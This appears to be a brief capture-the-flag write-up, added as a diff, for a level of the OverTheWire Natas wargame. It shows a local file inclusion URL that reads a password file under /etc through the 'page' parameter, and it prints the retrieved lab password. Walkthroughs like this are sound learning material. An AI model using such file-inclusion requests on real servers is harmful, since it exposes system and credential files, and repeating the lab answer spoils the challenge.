@@ -1,0 +1,6 @@
+Nothing on the page but the Home and About link.
+Viewing the page source, we can see the giveaway hint: hint: password for webuser natas8 is in /etc/natas_webpass/natas8
+
+Obvious that the webserver is running on Linux Apache, modify the url:
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+flag retrieved: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
